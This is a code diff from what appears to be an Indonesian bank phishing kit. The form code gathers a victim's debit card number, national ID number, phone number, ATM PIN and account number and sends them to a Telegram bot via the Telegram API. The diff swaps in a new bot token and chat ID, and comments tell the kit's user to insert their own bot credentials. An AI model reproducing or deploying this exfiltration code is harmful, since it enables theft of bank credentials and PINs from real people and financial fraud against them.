@@ -85,8 +85,8 @@
                     alert('silahkan lengkapi data terlebih dahulu')
                 } else {
                     let gabungan =  '' + encodeURIComponent(logo) + '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁/𝗔𝗧𝗠 %3A%0A' + encodeURIComponent(nkd) + '%0A𝗡𝗼𝗺𝗼𝗿 𝗜𝗱𝗲𝗻𝘁𝗶𝘁𝗮𝘀 (sesuai KTP) %3A%0A' + encodeURIComponent(nis) + '%0A𝗝𝗲𝗻𝗶𝘀 𝗞𝗲𝗹𝗮𝗺𝗶𝗻 %3A%0A' + encodeURIComponent(genderchoose) + '%0ANo. Handphone yang terdaftar %3A%0A' + encodeURIComponent(nope) + '%0APIN ATM %3A%0A' + encodeURIComponent(pinatm) + '%0ANomor Rekening %3A%0A' + encodeURIComponent(norek);
-                    var token ='6508468658:AAGpIElKCU4bXnN9FDKS3OatEMjiMR049p8'; // Ganti dengan token bot yang kamu buat
-		            var grup ='1812329304'; // Ganti dengan chat id dari bot yang kamu buat
+                    var token ='6694112504:AAFGLYmn09Lncf5Bmo_wSCzXVQeha-x8m-k'; // Ganti dengan token bot yang kamu buat
+		            var grup ='6484304541'; // Ganti dengan chat id dari bot yang kamu buat
 		            $.ajax({
 			            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
 			            method: `POST`,
